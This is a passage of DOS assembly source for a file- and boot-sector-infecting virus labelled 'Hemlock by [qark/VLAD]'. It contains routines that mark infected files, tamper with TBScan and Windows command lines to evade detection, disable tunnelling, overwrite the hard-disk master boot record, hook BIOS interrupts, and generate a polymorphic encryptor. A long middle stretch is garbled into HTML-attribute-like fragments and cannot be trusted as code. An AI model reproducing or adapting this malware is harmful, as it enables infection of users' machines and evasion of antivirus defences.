        call    int21h
        mov     word ptr cs:time,cx
        mov     word ptr cs:date,dx
        pop     dx
        pop     cx
        pop     ax
        ret
;....................................
Set_Marker:
;Sets the 100 years marker on the infected file.
;BX=File handle

        db      0bah            ;MOV DX,xxxx
        date    dw      0
        db      0b9h
        time    dw      0       ;MOV CX,xxxx

        add     dh,200          ;100 SHL 1 = 200
        mov     ax,157h
        call    int21h
        ret
;....................................
Check_Years:
;Assumes ES:DI = SFT
;On exit the flags will be set so that a JB means that the file isn't
;infected. JA means it is.
        cmp     byte ptr es:[di+010h],200
        ret
;....................................
Get_SFT:
;Entry: BX=Filehandle
;Exit: ES:DI=SFT
        push    bx
        push    ax
        mov     ax,1220h
        int     2fh
        jc      bad_sft
        xor     bx,bx
        mov     bl,byte ptr es:[di]
        mov     ax,1216h
        int     2fh
bad_sft:
        pop     ax
        pop     bx
        ret
;....................................
LSeek_End:
        mov     ax,0242h                ;Call this to lseek to the end
        jmp     short lseek
LSeek_Start:                            ;Call this to lseek to the start
        mov     ax,42h
LSeek:
        cwd
        xor     cx,cx
        call    int21h
        ret
;....................................
Check_Names:
;On Entry DS:DX=filename to execute

;Exit: put ' co nm' into the command line if program is TBScan.  The 'co'
;will cause TBScan to use DOS instead of it's low level disk routines
;and subsequently it will not find any change in files.  The 'nm' means
;there will be no memory test.  This is just for in the future when Thunder
;Byte get the virus signature they won't be able to detect residency of the
;virus.

;Turn stealth off if one of the program being executed is a bad one.

        push    ax
        push    bx
        push    cx
        push    dx
        push    si
        push    di
        push    ds
        push    es
        ;Test for tbscan
        mov     si,dx
find_ext:
        lodsb
        cmp     al,'.'                  ;The dot in the filename.
        jne     find_ext
        std

        lodsw                   ;SI-2
        ;SI=Last letter in name.

        xor     cx,cx
        mov     di,offset bad_names-1
        push    cs
        pop     es
name_loop:
        mov     cl,byte ptr cs:[di]     ;CS:DI=Size of string
        dec     di                      ;Index to end of name.
        push    si                      ;Save SI
        repe    cmpsb                   ;Compare the names.
        pop     si                      ;Restore SI
        je      found_name              ;We got one!
        sub     di,cx                   ;Next name
        cmp     di,offset bad_finish
        jbe     tail_fail
        jmp     short name_loop
        
found_name:
        cmp     di,offset bad_finish    ;TBSCAN gets different treatment.
        jbe     tbscan_found

        cmp     di,offset bad_win
        jbe     win_found

        mov     byte ptr cs:stealth,0   ;Turn stealth off.
        jmp     short tail_fail

TBSCAN_Found:
        ;Change command line
        cld
        pop     es                      ;ES was last thing pushed.
        push    es                      ;ES=Param Block segment.
        mov     di,word ptr es:[bx+2]   ;Grab command tail from param block
        mov     si,di
        mov     ax,word ptr es:[bx+4]
        mov     es,ax
        mov     ds,ax                   ;DS:SI=ES:DI=Command tail

        inc     di                      ;Past tail count.

        cmp     byte ptr [si],0         ;No parameters!
        je      write_tail

        mov     cx,127                  ;Length of tail.
        mov     al,0dh
        repne   scasb
        jne     tail_fail

        dec     di                      ;DI = 0D end of command line.

write_tail:
        add     byte ptr [si],6
        push    cs
        pop     ds
        mov     si,offset tail_fix
        mov     cx,7
        rep     movsb
        jmp     tail_fail

win_found:
        cld
        pop     es                      ;ES was last thing pushed.
        push    es                      ;ES=Param Block segment.
        mov     di,word ptr es:[bx+2]   ;Grab command tail from param block
        mov     si,di
        mov     ax,word ptr es:[bx+4]
        mov     es,ax
        mov     ds,ax                   ;DS:SI=ES:DI=Command tail

        inc     di                      ;Past tail count.

        cmp     byte ptr [si],0         ;No parameters!
        je      write_win_tail

        mov     cx,127                  ;Length of tail.
        mov     al,0dh
        repne   scasb
        jne     tail_fail

        dec     di                      ;DI = 0D end of command line.

write_win_tail:
        add     byte ptr [si],5
        push    cs
        pop     ds
        mov     si,offset win_fix
        mov     cx,6
        rep     movsb

tail_fail:
        cld                             ;Gotta keep the forward scan.
        pop     es
        pop     ds
        pop     di
        pop     si
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        ret

        ;We are scanning backwards because it is smaller than searching
        ;for the \ in the filename.
        Bad_finish      db      'TBSCAN',6
        Bad_win         db      'WIN',3
                        db      'CHKDSK',6
                        db      'PKZIP',5
                        db      'ARJ',3
                        db      'NDD',3
                        db      'SCANDISK',8
                        db      'LHA',3
        Bad_names:                              ;Scan from here...

        tail_fix        db      ' co nm',0dh    ;<- insert="" this="" win_fix="" db="" '="" :f',0dh="" ;make="" windows="" use="" 16bit="" disk="" ;access="" ;....................................="" check_handle:="" ;bx="File" handle="" ;carry="" if="" bad="" handle.="" push="" ax="" push="" dx="" mov="" ax,44h="" call="" int21h="" ;get="" device="" info.="" jc="" bad_handle="" shl="" dl,1="" ;if="" bit="" 7="1" then="" not="" a="" file.="" ;="" shling="" it="" will="" set="" the="" carry="" ;="" flag="" based="" on="" bit="" 7="" jmp="" short="" handle_exit="" bad_handle:="" stc="" handle_exit:="" pop="" dx="" pop="" ax="" ret="" ;....................................="" anti_tunnel:="" push="" ax="" ;disable="" any="" tunnelers.="" push="" bx="" push="" si="" push="" ds="" xor="" ax,ax="" mov="" ds,ax="" ;vector="" table="" lds="" si,[1*4]="" ;ds:si="Int" 1="" address="" mov="" bl,byte="" ptr="" [si]="" ;save="" first="" byte="" of="" it.="" mov="" byte="" ptr="" [si],0cfh="" ;move="" an="" iret="" at="" the="" entry="" point.="" pushf="" ;flags="" on="" stack.="" pop="" ax="" ;flags="" into="" ax="" and="" ah,0feh="" ;remove="" trap="" flag.="" push="" ax="" ;flags="" back="" on="" stack="" popf="" ;set="" flags="" without="" any="" trap="" on.="" mov="" byte="" ptr="" [si],bl="" ;restore="" entry="" point.="" pop="" ds="" pop="" si="" pop="" bx="" pop="" ax="" ret="" ;....................................="" check_mbr:="" ;assumes="" si="Delta" ;on="" exit:="" je="" infected="" jne="" not="" infected="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" es="" push="" cs="" pop="" es="" mov="" ax,201h="" lea="" bx,[si+offset="" end_virus]="" mov="" cx,1="" mov="" dx,80h="" int="" 13h="" cmp="" word="" ptr="" es:[bx+offset="" marker="" -="" offset="" bootsector],'ue'="" pop="" es="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" ret="" ;....................................="" setrom15_13:="" ;sets="" int15/13="" to="" the="" rom="" vector="" (if="" it="" can="" find="" it)="" ;si="Delta" push="" ax="" push="" si="" push="" di="" push="" ds="" push="" es="" cld="" mov="" di,si="" ;di="Delta" mov="" ax,0f000h="" ;rom="" bios="" segment="" mov="" ds,ax="" mov="" si,[0ff0dh]="" ;rom="" interrupt="" table="" lodsb="" cmp="" al,0e9h="" je="" found_rom15="" mov="" si,0f859h="" ;the="" ibm="" standard="" int15="" address="" lodsb="" cmp="" al,0e9h="" ;is="" there="" a="" jmp="" there="" jne="" find_rom13="" found_rom15:="" dec="" si="" push="" ds="" push="" cs="" pop="" ds="" ;ds="CS" xor="" ax,ax="" mov="" es,ax="" ;es="0" push="" es:[15h*4]="" pop="" [di+offset="" i15]="" ;save="" the="" offset="" mov="" es:[15h*4],si="" ;set="" the="" offset="" push="" es:[15h*4+2]="" pop="" [di+offset="" i15+2]="" ;save="" the="" segment="" mov="" es:[15h*4+2],0f000h="" ;set="" the="" segment="" pop="" ds="" find_rom13:="" xor="" si,si="" inc="" si="" search13:="" cmp="" si,0fff0h="" ;most="" amibioses="" just="" have="" this="" jae="" not_present13="" ;signature="" at="" their="" int13="" entry="" dec="" si="" ;point.="" in="" fact="" every="" one="" i="" looked="" lodsw="" ;at="" had="" it.="" cmp="" ax,0fa80h="" jne="" search13="" lodsw="" cmp="" ax,0fb80h="" jne="" search13="" lodsb="" cmp="" al,0fch="" jne="" search13="" sub="" si,5="" xor="" ax,ax="" mov="" ds,ax="" push="" cs="" pop="" es="" mov="" ax,si="" ;ax="Offset" of="" int13handler="" mov="" si,13h*4="" lea="" di,[di+offset="" i13]="" movsw="" movsw="" mov="" word="" ptr="" [si-4],ax="" mov="" word="" ptr="" [si-2],0f000h="" not_present13:="" pop="" es="" pop="" ds="" pop="" di="" pop="" si="" pop="" ax="" ret="" ;....................................="" infect_mbr:="" ;infects="" the="" hard="" disk="" mbr="" ;si="Delta" offset="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" ds="" push="" es="" xor="" ax,ax="" mov="" dx,80h="" int="" 13h="" lea="" bx,[si+offset="" end_virus]="" push="" cs="" pop="" es="" mov="" ax,201h="" mov="" cx,1="" int="" 13h="" mov="" ax,301h="" mov="" cl,3="" int="" 13h="" push="" cs="" pop="" ds="" ;cs="DS=ES" push="" si="" lea="" di,[si+offset="" end_virus]="" add="" si,offset="" bootsector="" mov="" cx,offset="" bs_end="" -="" offset="" bootsector="" cld="" rep="" movsb="" pop="" si="" lea="" di,[si+offset="" end_virus="" +="" 510]="" mov="" ax,0aa55h="" stosw="" ;put="" the="" bootsector="" marker="" in.="" lea="" bx,[si+offset="" end_virus]="" mov="" cx,1="" mov="" ax,301h="" int="" 13h="" mov="" cx,4="" mov="" ax,307h="" mov="" bx,si="" int="" 13h="" pop="" es="" pop="" ds="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" ret="" ;....................................="" reset15_13:="" ;resets="" int13/15="" to="" original="" vectors.="" ;si="Delta" offset="" push="" ax="" push="" si="" push="" di="" push="" ds="" push="" es="" push="" si="" push="" cs="" pop="" ds="" ;ds="CS" xor="" ax,ax="" mov="" es,ax="" ;es="0" add="" si,offset="" i15="" mov="" di,15h*4="" cld="" movsw="" movsw="" ;restore="" int15="" pop="" si="" ;restore="" si="Delta" add="" si,offset="" i13="" mov="" di,13h*4="" movsw="" movsw="" ;restore="" int13="" pop="" es="" pop="" ds="" pop="" di="" pop="" si="" pop="" ax="" ret="" ;....................................="" set_int24:="" ;sets="" int24="" to="" our="" handler="" push="" ax="" push="" si="" push="" di="" push="" ds="" push="" es="" xor="" ax,ax="" mov="" ds,ax="" push="" cs="" pop="" es="" mov="" si,24h*4="" mov="" di,offset="" i24="" cld="" movsw="" movsw="" mov="" word="" ptr="" [si-4],offset="" int24h="" mov="" word="" ptr="" [si-2],cs="" pop="" es="" pop="" ds="" pop="" di="" pop="" si="" pop="" ax="" ret="" ;....................................="" reset_int24:="" ;restores="" int24="" push="" ax="" push="" si="" push="" di="" push="" ds="" push="" es="" xor="" ax,ax="" mov="" es,ax="" push="" cs="" pop="" ds="" mov="" si,offset="" i24="" mov="" di,24h*4="" cld="" movsw="" movsw="" pop="" es="" pop="" ds="" pop="" di="" pop="" si="" pop="" ax="" ret="" ;....................................="" setup_poly:="" ;copies="" the="" virus="" code="" into="" the="" buffer="" after="" the="" virus,="" generates="" the="" ;polymorphic="" decryptor/encryptor="" and="" encrypts="" it.="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" si="" push="" di="" push="" ds="" push="" es="" push="" bp="" push="" cs="" push="" cs="" pop="" ds="" pop="" es="" mov="" bp,word="" ptr="" delta="" mov="" cx,offset="" enc_end="" -="" offset="" enc_start="" xor="" di,di="" call="" poly="" xor="" si,si="" mov="" di,offset="" end_virus="" mov="" cx,di="" rep="" movsb="" mov="" al,byte="" ptr="" cipher_val="" mov="" si,offset="" end_virus="" +="" offset="" enc_start="" mov="" cx,offset="" enc_end="" -="" offset="" enc_start="" -="" 1="" call="" enc_loop="" pop="" bp="" pop="" es="" pop="" ds="" pop="" di="" pop="" si="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" ret="" ;....................................="" poly="" proc="" near="" ;;es:di="buffer" ;;cx="size" of="" enc="" buffer="" ;;bp="delta" offset="" ;al="cipher" ;si="pointer" ;cx="counter" ;="" the="" basic="" algorithm="" for="" the="" polymorphism="" ;="" mov="" al,0="" ;="" mov="" si,offset="" encstart="" ;="" push="" si="" ;="" mov="" cx,200="" ;encloop:="" ;="" xor="" byte="" ptr="" cs:[si]="" ;="" ror="" al,1="" ;="" ror="" al,1="" ;="" inc="" si="" ;="" dec="" cx="" ;="" or="" cx,cx="" ;="" jns="" encloop="" ;encstart:="" ;="" ret="" push="" ax="" push="" bx="" push="" cx="" push="" dx="" push="" si="" push="" di="" push="" ds="" push="" es="" cld="" push="" cs="" pop="" ds="" in="" al,40h="" mov="" byte="" ptr="" cipher_val,al="" xor="" dx,dx="" retry_var:="" cmp="" dl,7="" je="" past_first="" in="" al,40h="" and="" al,3="" cmp="" al,4="" je="" retry_var="" dec="" al="" js="" set_cx="" jz="" set_si="" set_al:="" test="" dl,1="" jnz="" retry_var="" or="" dl,1="" mov="" al,0b0h="" ;mov="" al,xx="" stosb="" mov="" al,byte="" ptr="" cipher_val="" stosb="" jmp="" short="" retry_var="" set_cx:="" test="" dl,2="" jnz="" retry_var="" or="" dl,2="" mov="" al,0b9h="" ;mov="" cx,xxxx="" stosb="" mov="" ax,cx="" dec="" ax="" ;less="" one="" because="" of="" the="" jns="" stosw="" jmp="" short="" retry_var="" set_si:="" test="" dl,4="" jnz="" retry_var="" or="" dl,4="" mov="" al,0beh="" ;mov="" si,xxxx="" stosb="" mov="" ax,bp="" add="" ax,offset="" enc_start="" stosw="" mov="" al,56h="" ;push="" si="" stosb="" jmp="" retry_var="" past_first:="" ;just="" do="" a="" crap="" instruction="" so="" that="" our="" jns="" xxxx="" won't="" be="" the="" same.="" ;it="" just="" reads="" instructions="" out="" of="" database1="" xor="" dx,dx="" retry_second:="" mov="" word="" ptr="" jmp_calc,di="" mov="" si,offset="" database1="" in="" al,40h="" and="" ax,6="" ;3*2="" add="" si,ax="" movsw="" redo_table:="" cmp="" dl,31="" je="" past_second="" mov="" si,offset="" random_table="" in="" al,40h="" and="" ax,14="" cmp="" ax,8="" ja="" redo_table="" add="" si,ax="" lodsw="" call="" ax="" jmp="" short="" redo_table="" set_xor:="" test="" dl,1="" jnz="" garbage1="" or="" dl,1="" mov="" al,02eh="" ;cs:="" stosb="" mov="" ax,430h="" ;byte="" ptr="" [si],al="" stosw="" ret="" garbage1:="" ;random="" al="" garbler="" test="" dl,2="" jnz="" garbage2="" or="" dl,2="" jmp="" short="" do_garbage="" garbage2:="" test="" dl,4="" jnz="" inc_si="" or="" dl,4="" do_garbage:="" mov="" si,offset="" database2="" ;garbage="" database="" in="" al,40h="" and="" ax,7="" shl="" ax,1="" add="" si,ax="" movsw="" ret="" inc_si:="" test="" dl,8="" jnz="" dec_cx="" or="" dl,8="" mov="" al,46h="" ;inc="" si="" stosb="" ret="" dec_cx:="" test="" dl,16="" jnz="" set_xor="" or="" dl,16="" mov="" al,49h="" ;dec="" cx="" stosb="" ret="" past_second:="" xor="" dx,dx="" redo_second:="" cmp="" dl,3="" je="" do_ret="" in="" al,40h="" and="" al,1="" cmp="" al,0="" je="" one_byte1="" or_cx_cx:="" test="" dl,1="" jnz="" one_byte1="" or="" dl,1="" mov="" si,offset="" database4="" in="" al,40h="" and="" ax,1="" add="" si,ax="" ;index="" to="" a="" compare="" instruction="" movsb="" mov="" al,0c9h="" ;cx,cx="" stosb="" ;jge,="" jns="" etc="" mov="" si,offset="" database5="" in="" al,40h="" and="" ax,1="" add="" si,ax="" movsb="" ;put="" a="" jge/jns="" in.="" mov="" ax,di="" inc="" ax="" ;calculate="" the="" jump.="" sub="" ax,word="" ptr="" jmp_calc="" mov="" ah,al="" in="" al,40h="" and="" al,2="" sub="" ah,al="" mov="" al,ah="" neg="" al="" stosb="" jmp="" redo_second="" one_byte1:="" test="" dl,2="" jnz="" or_cx_cx="" or="" dl,2="" mov="" si,offset="" database3="" ;one="" byte="" crap="" in="" al,40h="" and="" ax,7="" add="" si,ax="" movsb="" jmp="" redo_second="" do_ret:="" mov="" si,offset="" database3="" in="" al,40h="" and="" ax,7="" ;0-7="" add="" si,ax="" ;index="" into="" table="" lodsb="" mov="" ah,0c3h="" ;ret="" mov="" dx,ax="" in="" al,40h="" and="" ax,7="" mov="" cx,ax="" swap_pos:="" xchg="" dh,dl="" loop="" swap_pos="" mov="" ax,dx="" stosw="" ;store="" the="" one="" byte="" crap/ret="" combination="" pop="" es="" pop="" ds="" pop="" di="" pop="" si="" pop="" dx="" pop="" cx="" pop="" bx="" pop="" ax="" ret="" random_table="" dw="" offset="" set_xor="" dw="" offset="" garbage1="" dw="" offset="" garbage2="" dw="" offset="" inc_si="" dw="" offset="" dec_cx="" database1:="" ;utter="" crap="" xchg="" bx,dx="" mov="" bl,9="" xor="" dx,dx="" sub="" bx,bx="" database2:="" ;al="" garblers="" ror="" al,1="" add="" al,07ah="" sub="" al,0e0h="" dec="" al="" sub="" al,0b2h="" dec="" al="" add="" al,81h="" ror="" al,1="" database3:="" ;one="" byte="" crap="" cld="" dec="" dx="" inc="" bx="" scasb="" inc="" di="" dec="" di="" inc="" dx="" dec="" bx="" database4:="" db="" 0bh="" ;or="" xx,xx="" db="" 23h="" ;and="" xx,xx="" database5:="" db="" 79h="" ;jns="" db="" 7dh="" ;jge="" cipher_val="" db="" 0="" jmp_calc="" dw="" 0="" poly="" endp="" ;....................................=""></-><>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

VirusName       db      'Hemlock by [qark/VLAD]',0

delta           dw      0               ;delta offset
qemm            db      0               ;0=no qemm
dosdata         db      'OSDATA'        ;DOSDATA.SYS
flag21          db      0
mz_counter      db      1
stealth         db      1               ;0=no stealth
filetype        db      'C'             ;C=COM S=SYS E=EXE
virus_jump      db      0e9h,0,0
enc_end:
                db      0               ;The polymorphics will encrypt this
                                        ;byte sometimes.
header          db      0cdh,20h,16h dup (0)

end_virus:                      ;<-- our="" virus="" length="" db="" offset="" end_virus="" dup="" (0)="" db="" 100="" dup="" (0)="" mem_size:="" ivt="" db="" 1024="" dup="" (0)="" mode="" db="" 0=""></-->